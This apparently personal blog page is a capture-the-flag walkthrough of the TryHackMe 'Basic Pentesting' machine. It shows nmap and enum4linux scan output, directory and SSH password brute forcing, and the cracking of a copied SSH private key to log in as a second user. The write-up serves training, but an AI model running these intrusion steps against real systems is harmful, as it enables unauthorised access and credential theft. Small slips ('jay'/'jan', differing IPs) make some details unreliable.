<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Projects - TryHackMe - Basic Pentesting</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link rel="icon" href="assets/img/favicon.png">
  <link href="assets/img/favicon.png" rel="apple-touch-icon">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top">
    <div class="container d-flex align-items-center justify-content-between">

      <h1 class="logo"><a href="./index.html">carattj</a></h1>

      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto" href="index.html#about">About</a></li>
          <li><a class="nav-link scrollto" href="index.html#experiences">Experiences</a></li>
          <li><a class="nav-link scrollto" href="index.html#education">Education</a></li>
          <li><a class="nav-link scrollto" href="index.html#contact">Contact</a></li>
          <li><a class="nav-link scrollto active" href="projects.html">Projects and Articles</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav>

    </div>
  </header>
  <!-- End Header -->

  <div class="hero hero-single route bg-image" style="background-image: url(assets/img/overlay-bg.jpg)">
    <div class="overlay-mf"></div>
    <div class="hero-content display-table">
      <div class="table-cell">
        <div class="container">
          <h2 class="hero-title mb-4">TryHackMe - Basic Pentesting</h2>
          <ol class="breadcrumb d-flex justify-content-center">
            <li class="breadcrumb-item">
              <a href="./projects.html#blog">Projects</a>
            </li>
            <li class="breadcrumb-item active">TryHackMe - Basic Pentesting</li>
          </ol>
        </div>
      </div>
    </div>
  </div>

  <main id="main">

    <!-- ======= Blog Single Section ======= -->
    <section class="blog-wrapper sect-pt4" id="blog">
      <div class="container">
        <div class="row">

          <div class="col-md-8">

            <!-- Left Column -->
            <div class="post-box">
              <div class="post-thumb">

                <!-- Pictures -->
                <section id="portfolio-details" class="portfolio-details">

                  <div class="portfolio-details-slider swiper">
                    <div class="swiper-wrapper align-items-center">

                      <div>
                        <img src="assets/img/projects/TryHackMe-BasicPentesting/tryhackme-basic-pentesting.jpg" alt="">
                      </div>

                    </div>
                    <div class="swiper-pagination"></div>
                  </div>
                </section>

              </div>
              <div class="post-meta">
                <h1 class="article-title">TryHackMe - Basic Pentesting</h1>
                <ul>
                  <li>
                    <span class="bi bi-person"></span>
                    <a href="./index.html#about">Jacopo Caratti</a>
                  </li>
                  <li>
                    <span class="bi bi-tag"></span>
                    <a href="#">Pentesting</a>
                  </li>
                  <li>
                    <span class="bi bi-calendar"></span>
                    <a href="#">2021</a>
                  </li>
                </ul>
              </div>

              <div class="article-content">
                <p>
                  The purpose of this machine is to allow us to practice web app hacking and privilege escalation.
                </p>

                <p>
                  I start scanning ports through <b>nmap</b>, which tells me there are 6 ports open (22, 80, 139, 445,
                  8009, 8080).
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>>> nmap -sC -sV -oN nmap_scan.txt [ip_address>]</p>
                    <p>
                    <pre>
# Nmap 7.92 scan initiated Sun Feb 27 08:49:39 2022 as: nmap -sC -sV -oN nmap/initial 10.10.30.5
Nmap scan report for 10.10.30.5
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-02-27T08:49:52-05:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-27T13:49:53
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 08:49:57 2022 -- 1 IP address (1 host up) scanned in 18.96 seconds
                    </pre>
                    </p>
                  </div>
                </div>

                <p>
                  I see the http port 80 is open, then I open [ip_address]:80 in the browser, and I inspect the page
                  using the developers tools.
                  It is written that there could be hidden pages, therefore I brute force the domain using
                  <b>gobuster</b>.
                  We also have to provide a wordlist, luckily in Kali linux there are many of them.
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>>> gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -o
                      gobuster_scan.txt</p>
                    <p>
                    <pre>
/development          (Status: 301) [Size: 314] [--> http://10.10.30.5/development/]
                    </pre>
                    </p>
                  </div>
                </div>

                <p>
                  I found the hidden /development page, where we have access to an Apache/2.4.18 server. Here, we can
                  view the two files dev.txt and j.txt.
                  They tell me the system is probably using easy passwords.
                </p>

                <p>
                  On ports 139 and 445 SMB services are running, I enumerate them using <b>enum4linnux</b>, and I
                  discover two usernames of the system are 'kay' and 'jan'.
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>>> enum4linnux -a [ip_address]</p>
                    <p>
                    <pre>
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb 27 12:01:30 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.128.212
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.128.212    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.128.212    |
 ============================================= 
Looking up status of 10.10.128.212
	BASIC2          <00> -         B <ACTIVE>  Workstation Service
	BASIC2          <03> -         B <ACTIVE>  Messenger Service
	BASIC2          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.128.212    |
 ====================================== 
[+] Server 10.10.128.212 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.128.212    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.128.212    |
 ======================================= 
[+] Got OS info for 10.10.128.212 from smbclient: 
[+] Got OS info for 10.10.128.212 from srvinfo:
	BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.128.212    |
 ============================== 


 ========================================== 
|    Share Enumeration on 10.10.128.212    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.128.212
//10.10.128.212/Anonymous	Mapping: OK, Listing: OK
//10.10.128.212/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.128.212    |
 ===================================================== 


[+] Attaching to 10.10.128.212 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] BASIC2
	[+] Builtin

[+] Password Info for Domain: BASIC2

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.128.212    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.128.212 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''
S-1-5-21-2853212168-2008227510-3551253869-500 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
S-1-5-21-2853212168-2008227510-3551253869-502 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-503 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-504 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-505 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-506 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-507 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-508 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-509 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-510 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-511 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-512 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)
S-1-5-21-2853212168-2008227510-3551253869-514 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-515 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-516 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-517 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-518 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-519 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-520 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-521 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-522 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-523 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-524 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-525 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-526 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-527 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-528 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-529 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-530 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-531 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-532 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-533 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-534 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-535 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-536 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-537 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-538 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-539 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-540 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-541 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-542 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-543 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-544 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-545 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-546 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-547 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-548 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-549 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-550 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1000 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1001 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1002 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1003 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1004 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1005 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1006 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1007 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1008 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1009 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1010 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1011 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1012 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1013 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1014 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1015 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1016 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1017 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1018 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1019 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1020 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1021 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1022 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1023 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1024 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1025 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1026 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1027 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1028 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1029 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1030 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1031 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1032 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1033 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1034 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1035 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1036 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1037 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1038 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1039 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1040 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1041 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1042 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1043 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1044 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1045 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1046 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1047 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1048 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1049 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 ============================================== 
|    Getting printer info for 10.10.128.212    |
 ============================================== 
No printers returned.


enum4linux complete on Sun Feb 27 12:05:01 2022
                    </pre>
                    </p>
                  </div>
                </div>

                <p>
                  Now that I know two usernames, and the fact that there is an easy password protecting the system, I
                  bruteforce the password.
                  This time, I use <b>hydra</b>, providing a single user (-l), a list of passwords (-P), and the
                  protocol I'm going to use.
                  To use a list of users, I would have used -L, and a single password -p.
                </p>

                <p>
                  I get a match: the password of 'jay' is 'armando'.
                </p>

                <p>
                  I connect to the server and navigate through the filesystem.
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>>> ssh jan@[ip_address]</p>
                    <p>...</p>
                  </div>
                </div>

                <p>
                  Inside the .ssh directory, there are 3 interesting files related to ssh symmetric cryptography.
                  In particular, there is the private key of the second user, 'kay', stored inside id_rsa.
                  I copy id_rsa to my machine into k_key, and I change its permissions to later use it for ssh
                  connection.<br>
                  To decode it, I use <b>JohnTheRipper</b> tool. I look for the converter for the key to a readable
                  hash, and use john to find the password:
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>chmod 600 k_key</p>
                    <p>...</p>
                    <p>>> locate ssh2john python3 ssh2john.py k_key > k_key_john</p>
                    <p>...</p>
                    <p>>> john --wordlist=rockyou.txt k_key_john</p>
                    <p>...</p>
                  </div>
                </div>

                <p>
                  The password for the ssh private key is 'beeswax'.<br>
                  Finally, by knowing the password, I connect as 'kay' using ssh and providing the private key as
                  command line argument:
                </p>
                <div class="console">
                  <header>
                    <p>guest@carattj</p>
                  </header>
                  <div class="consolebody">
                    <p>ssh -i k_key kay@<ip_address>
                    </p>
                    <p>...</p>
                  </div>
                </div>

                <p>
                  Now, I can read the pass.bak file inside 'kay' home directory, that contains the password-flag to be
                  captured.
                </p>
              </div>

            </div>
          </div>

            <!-- Right Column -->
            <div class="col-md-4">

              <!-- General Info -->
              <div class="widget-sidebar">
                <h5 class="sidebar-title">Related Links</h5>
                <div class="sidebar-content">
                  <ul class="list-sidebar">
                    <li>
                      <a href="https://github.com/carattj/tryhackme/tree/main/basic_pentesting" target="_blank">GitHub
                        <span class="bi bi-github"></span></a>
                    </li>
                  </ul>
                </div>
              </div>

              <!-- Tags -->
              <div class="widget-sidebar widget-tags">
                <h5 class="sidebar-title">Tags</h5>
                <div class="sidebar-content">
                  <ul>
                    <li>
                      <a href="#">TryHackMe</a>
                    </li>
                    <li>
                      <a href="#">Pentesting</a>
                    </li>
                    <li>
                      <a href="#">Hacking</a>
                    </li>
                  </ul>
                </div>
              </div>

              <!-- Archive -->
              <!-- <div class="widget-sidebar">
                <h5 class="sidebar-title">Archives</h5>
                <div class="sidebar-content">
                  <ul class="list-sidebar">
                    <li>
                      <a href="#">September, 2017.</a>
                    </li>
                    <li>
                      <a href="#">April, 2017.</a>
                    </li>
                    <li>
                      <a href="#">Nam quo autem exercitationem.</a>
                    </li>
                    <li>
                      <a href="#">Atque placeat maiores nam quo autem</a>
                    </li>
                    <li>
                      <a href="#">Nam quo autem exercitationem.</a>
                    </li>
                  </ul>
                </div>
              </div> -->

            </div>

          </div>
        </div>
    </section><!-- End Blog Single Section -->

  </main>
  <!-- End #main -->

  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
      class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/purecounter/purecounter.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/typed.js/typed.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

</body>

</html>